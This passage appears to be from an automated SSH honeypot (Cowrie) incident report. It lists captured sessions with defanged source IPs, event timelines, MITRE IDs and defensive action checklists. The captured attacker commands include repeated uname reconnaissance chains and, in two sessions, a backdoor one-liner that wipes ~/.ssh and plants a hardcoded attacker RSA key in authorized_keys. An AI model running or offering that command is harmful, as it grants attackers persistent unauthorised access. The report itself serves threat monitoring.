| `2026-07-22 05:41:28` | `cowrie.client.version` |
| `2026-07-22 05:41:28` | `cowrie.client.kex` |
| `2026-07-22 05:41:30` | `cowrie.login.success` |
| `2026-07-22 05:41:32` | `cowrie.session.params` |
| `2026-07-22 05:41:32` | `cowrie.command.input` |
| `2026-07-22 05:41:32` | `cowrie.log.closed` |
| `2026-07-22 05:41:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcf43a2aa7a5

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:42 |
| **Last Seen** | 2026-07-22 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:42:05` | `cowrie.session.connect` |
| `2026-07-22 05:42:05` | `cowrie.client.version` |
| `2026-07-22 05:42:05` | `cowrie.client.kex` |
| `2026-07-22 05:42:05` | `cowrie.login.success` |
| `2026-07-22 05:42:06` | `cowrie.session.params` |
| `2026-07-22 05:42:06` | `cowrie.command.input` |
| `2026-07-22 05:42:06` | `cowrie.log.closed` |
| `2026-07-22 05:42:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab226cf488f3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:43 |
| **Last Seen** | 2026-07-22 05:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:43:22` | `cowrie.session.connect` |
| `2026-07-22 05:43:22` | `cowrie.client.version` |
| `2026-07-22 05:43:22` | `cowrie.client.kex` |
| `2026-07-22 05:43:23` | `cowrie.login.success` |
| `2026-07-22 05:43:24` | `cowrie.session.params` |
| `2026-07-22 05:43:24` | `cowrie.command.input` |
| `2026-07-22 05:43:24` | `cowrie.command.input` |
| `2026-07-22 05:43:24` | `cowrie.command.input` |
| `2026-07-22 05:43:24` | `cowrie.command.input` |
| `2026-07-22 05:43:24` | `cowrie.command.input` |
| `2026-07-22 05:43:24` | `cowrie.command.success` |
| `2026-07-22 05:43:24` | `cowrie.command.input` |
| `2026-07-22 05:43:24` | `cowrie.command.input` |
| `2026-07-22 05:43:24` | `cowrie.command.input` |
| `2026-07-22 05:43:24` | `cowrie.command.input` |
| `2026-07-22 05:43:25` | `cowrie.log.closed` |
| `2026-07-22 05:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e29d7afc6bd5

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:44 |
| **Last Seen** | 2026-07-22 05:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:44:27` | `cowrie.session.connect` |
| `2026-07-22 05:44:27` | `cowrie.client.version` |
| `2026-07-22 05:44:27` | `cowrie.client.kex` |
| `2026-07-22 05:44:27` | `cowrie.login.success` |
| `2026-07-22 05:44:28` | `cowrie.session.params` |
| `2026-07-22 05:44:28` | `cowrie.command.input` |
| `2026-07-22 05:44:28` | `cowrie.log.closed` |
| `2026-07-22 05:44:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07032ada0a95

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:45 |
| **Last Seen** | 2026-07-22 05:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:45:14` | `cowrie.session.connect` |
| `2026-07-22 05:45:14` | `cowrie.client.version` |
| `2026-07-22 05:45:14` | `cowrie.client.kex` |
| `2026-07-22 05:45:15` | `cowrie.login.success` |
| `2026-07-22 05:45:16` | `cowrie.session.params` |
| `2026-07-22 05:45:16` | `cowrie.command.input` |
| `2026-07-22 05:45:16` | `cowrie.command.input` |
| `2026-07-22 05:45:16` | `cowrie.command.input` |
| `2026-07-22 05:45:16` | `cowrie.command.input` |
| `2026-07-22 05:45:16` | `cowrie.command.input` |
| `2026-07-22 05:45:16` | `cowrie.command.success` |
| `2026-07-22 05:45:16` | `cowrie.command.input` |
| `2026-07-22 05:45:16` | `cowrie.command.input` |
| `2026-07-22 05:45:16` | `cowrie.command.input` |
| `2026-07-22 05:45:16` | `cowrie.command.input` |
| `2026-07-22 05:45:17` | `cowrie.log.closed` |
| `2026-07-22 05:45:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3023be29e77

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:46 |
| **Last Seen** | 2026-07-22 05:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:46:33` | `cowrie.session.connect` |
| `2026-07-22 05:46:33` | `cowrie.client.version` |
| `2026-07-22 05:46:33` | `cowrie.client.kex` |
| `2026-07-22 05:46:33` | `cowrie.login.success` |
| `2026-07-22 05:46:34` | `cowrie.session.params` |
| `2026-07-22 05:46:34` | `cowrie.command.input` |
| `2026-07-22 05:46:34` | `cowrie.log.closed` |
| `2026-07-22 05:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ef1b9f0a4fa

| Field | Detail |
|---|---|
| **Source IP** | `57.128.214[.]238` |
| **First Seen** | 2026-07-22 05:46 |
| **Last Seen** | 2026-07-22 05:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:46:34` | `cowrie.session.connect` |
| `2026-07-22 05:46:34` | `cowrie.client.version` |
| `2026-07-22 05:46:34` | `cowrie.client.kex` |
| `2026-07-22 05:46:35` | `cowrie.login.success` |
| `2026-07-22 05:46:35` | `cowrie.session.params` |
| `2026-07-22 05:46:35` | `cowrie.command.input` |
| `2026-07-22 05:46:35` | `cowrie.command.failed` |
| `2026-07-22 05:46:36` | `cowrie.log.closed` |
| `2026-07-22 05:46:36` | `cowrie.session.params` |
| `2026-07-22 05:46:36` | `cowrie.command.input` |
| `2026-07-22 05:46:36` | `cowrie.session.file_download` |
| `2026-07-22 05:46:36` | `cowrie.log.closed` |
| `2026-07-22 05:46:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.128.214[.]238` to AbuseIPDB if not already reported
- [ ] Block `57.128.214[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f081635d710

| Field | Detail |
|---|---|
| **Source IP** | `57.128.214[.]238` |
| **First Seen** | 2026-07-22 05:46 |
| **Last Seen** | 2026-07-22 05:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:46:37` | `cowrie.session.connect` |
| `2026-07-22 05:46:37` | `cowrie.client.version` |
| `2026-07-22 05:46:37` | `cowrie.client.kex` |
| `2026-07-22 05:46:37` | `cowrie.login.success` |
| `2026-07-22 05:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.128.214[.]238` to AbuseIPDB if not already reported
- [ ] Block `57.128.214[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd71c1954e9d

| Field | Detail |
|---|---|
| **Source IP** | `57.128.214[.]238` |
| **First Seen** | 2026-07-22 05:46 |
| **Last Seen** | 2026-07-22 05:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:46:37` | `cowrie.session.connect` |
| `2026-07-22 05:46:37` | `cowrie.client.version` |
| `2026-07-22 05:46:37` | `cowrie.client.kex` |
| `2026-07-22 05:46:38` | `cowrie.login.success` |
| `2026-07-22 05:46:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.128.214[.]238` to AbuseIPDB if not already reported
- [ ] Block `57.128.214[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec4d42ea13cf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:47 |
| **Last Seen** | 2026-07-22 05:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:47:08` | `cowrie.session.connect` |
| `2026-07-22 05:47:08` | `cowrie.client.version` |
| `2026-07-22 05:47:08` | `cowrie.client.kex` |
| `2026-07-22 05:47:09` | `cowrie.login.success` |
| `2026-07-22 05:47:11` | `cowrie.session.params` |
| `2026-07-22 05:47:11` | `cowrie.command.input` |
| `2026-07-22 05:47:11` | `cowrie.command.input` |
| `2026-07-22 05:47:11` | `cowrie.command.input` |
| `2026-07-22 05:47:11` | `cowrie.command.input` |
| `2026-07-22 05:47:11` | `cowrie.command.input` |
| `2026-07-22 05:47:11` | `cowrie.command.success` |
| `2026-07-22 05:47:11` | `cowrie.command.input` |
| `2026-07-22 05:47:11` | `cowrie.command.input` |
| `2026-07-22 05:47:11` | `cowrie.command.input` |
| `2026-07-22 05:47:11` | `cowrie.command.input` |
| `2026-07-22 05:47:11` | `cowrie.log.closed` |
| `2026-07-22 05:47:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbae461c3564

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-07-22 05:48 |
| **Last Seen** | 2026-07-22 05:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:48:30` | `cowrie.session.connect` |
| `2026-07-22 05:48:30` | `cowrie.client.version` |
| `2026-07-22 05:48:30` | `cowrie.client.kex` |
| `2026-07-22 05:48:31` | `cowrie.login.success` |
| `2026-07-22 05:48:32` | `cowrie.session.params` |
| `2026-07-22 05:48:32` | `cowrie.command.input` |
| `2026-07-22 05:48:32` | `cowrie.command.failed` |
| `2026-07-22 05:48:33` | `cowrie.log.closed` |
| `2026-07-22 05:48:34` | `cowrie.session.params` |
| `2026-07-22 05:48:34` | `cowrie.command.input` |
| `2026-07-22 05:48:34` | `cowrie.session.file_download` |
| `2026-07-22 05:48:34` | `cowrie.log.closed` |
| `2026-07-22 05:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c369bd16503

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-07-22 05:48 |
| **Last Seen** | 2026-07-22 05:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:48:34` | `cowrie.session.connect` |
| `2026-07-22 05:48:34` | `cowrie.client.version` |
| `2026-07-22 05:48:34` | `cowrie.client.kex` |
| `2026-07-22 05:48:35` | `cowrie.login.success` |
| `2026-07-22 05:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2afefc9dd096

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-07-22 05:48 |
| **Last Seen** | 2026-07-22 05:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:48:36` | `cowrie.session.connect` |
| `2026-07-22 05:48:36` | `cowrie.client.version` |
| `2026-07-22 05:48:36` | `cowrie.client.kex` |
| `2026-07-22 05:48:37` | `cowrie.login.success` |
| `2026-07-22 05:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c8624eb3c3f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:48 |
| **Last Seen** | 2026-07-22 05:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:48:48` | `cowrie.session.connect` |
| `2026-07-22 05:48:48` | `cowrie.client.version` |
| `2026-07-22 05:48:48` | `cowrie.client.kex` |
| `2026-07-22 05:48:49` | `cowrie.login.success` |
| `2026-07-22 05:48:49` | `cowrie.session.params` |
| `2026-07-22 05:48:49` | `cowrie.command.input` |
| `2026-07-22 05:48:50` | `cowrie.log.closed` |
| `2026-07-22 05:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-604f852020fa

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:49 |
| **Last Seen** | 2026-07-22 05:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:49:00` | `cowrie.session.connect` |
| `2026-07-22 05:49:00` | `cowrie.client.version` |
| `2026-07-22 05:49:00` | `cowrie.client.kex` |
| `2026-07-22 05:49:02` | `cowrie.login.success` |
| `2026-07-22 05:49:03` | `cowrie.session.params` |
| `2026-07-22 05:49:03` | `cowrie.command.input` |
| `2026-07-22 05:49:03` | `cowrie.command.input` |
| `2026-07-22 05:49:03` | `cowrie.command.input` |
| `2026-07-22 05:49:03` | `cowrie.command.input` |
| `2026-07-22 05:49:03` | `cowrie.command.input` |
| `2026-07-22 05:49:03` | `cowrie.command.success` |
| `2026-07-22 05:49:03` | `cowrie.command.input` |
| `2026-07-22 05:49:03` | `cowrie.command.input` |
| `2026-07-22 05:49:03` | `cowrie.command.input` |
| `2026-07-22 05:49:03` | `cowrie.command.input` |
| `2026-07-22 05:49:04` | `cowrie.log.closed` |
| `2026-07-22 05:49:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e74732e074d0

| Field | Detail |
|---|---|
| **Source IP** | `61.37.150[.]6` |
| **First Seen** | 2026-07-22 05:50 |
| **Last Seen** | 2026-07-22 05:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:50:07` | `cowrie.session.connect` |
| `2026-07-22 05:50:07` | `cowrie.client.version` |
| `2026-07-22 05:50:07` | `cowrie.client.kex` |
| `2026-07-22 05:50:09` | `cowrie.login.success` |
| `2026-07-22 05:50:10` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.37.150[.]6` to AbuseIPDB if not already reported
- [ ] Block `61.37.150[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3e9330b6042

| Field | Detail |
|---|---|
| **Source IP** | `59.120.8[.]61` |
| **First Seen** | 2026-07-22 05:50 |
| **Last Seen** | 2026-07-22 05:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:50:17` | `cowrie.session.connect` |
| `2026-07-22 05:50:17` | `cowrie.client.version` |
| `2026-07-22 05:50:17` | `cowrie.client.kex` |
| `2026-07-22 05:50:19` | `cowrie.login.success` |
| `2026-07-22 05:50:20` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.120.8[.]61` to AbuseIPDB if not already reported
- [ ] Block `59.120.8[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85f35143fc59

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:50 |
| **Last Seen** | 2026-07-22 05:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:50:51` | `cowrie.session.connect` |
| `2026-07-22 05:50:51` | `cowrie.client.version` |
| `2026-07-22 05:50:51` | `cowrie.client.kex` |
| `2026-07-22 05:50:52` | `cowrie.login.success` |
| `2026-07-22 05:50:54` | `cowrie.session.params` |
| `2026-07-22 05:50:54` | `cowrie.command.input` |
| `2026-07-22 05:50:54` | `cowrie.command.input` |
| `2026-07-22 05:50:54` | `cowrie.command.input` |
| `2026-07-22 05:50:54` | `cowrie.command.input` |
| `2026-07-22 05:50:54` | `cowrie.command.input` |
| `2026-07-22 05:50:54` | `cowrie.command.success` |
| `2026-07-22 05:50:54` | `cowrie.command.input` |
| `2026-07-22 05:50:54` | `cowrie.command.input` |
| `2026-07-22 05:50:54` | `cowrie.command.input` |
| `2026-07-22 05:50:54` | `cowrie.command.input` |
| `2026-07-22 05:50:54` | `cowrie.log.closed` |
| `2026-07-22 05:50:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-341ff2441a88

| Field | Detail |
|---|---|
| **Source IP** | `116.72.9[.]151` |
| **First Seen** | 2026-07-22 05:51 |
| **Last Seen** | 2026-07-22 05:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:51:07` | `cowrie.session.connect` |
| `2026-07-22 05:51:08` | `cowrie.client.version` |
| `2026-07-22 05:51:08` | `cowrie.client.kex` |
| `2026-07-22 05:51:10` | `cowrie.login.success` |
| `2026-07-22 05:51:11` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:51:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.72.9[.]151` to AbuseIPDB if not already reported
- [ ] Block `116.72.9[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
